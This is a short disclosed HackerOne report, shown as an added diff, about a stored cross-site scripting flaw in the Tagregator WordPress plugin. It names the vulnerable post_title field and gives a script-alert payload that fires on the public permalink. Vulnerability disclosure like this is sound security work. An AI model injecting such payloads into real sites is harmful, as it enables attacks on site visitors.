@@ -1,0 +1,21 @@
+ReportLink:https://hackerone.com/reports/35036
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/dia2diab
+ReportedTo:Ian Dunn(iandunn-projects)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:18.08.2016 1:19:00
+
+Summary:
+
+This is a XSS in Tagregator plugin that affect on wordpress users
+i'm making my test on alwaysdata host
+target: http://diaa.alwaysdata.net/wordpress/wp-admin/post-new.php?post_type=tggr-flickr
+infected input: post_title
+payload: <script>alert("a7a");</script>
+then get the Permalink that is generated for public user: http://diaa.alwaysdata.net/wordpress/?tggr-tweets=alerta7a
+alerted !!!
+ 
+tell me if you wanna any information
+thank you 
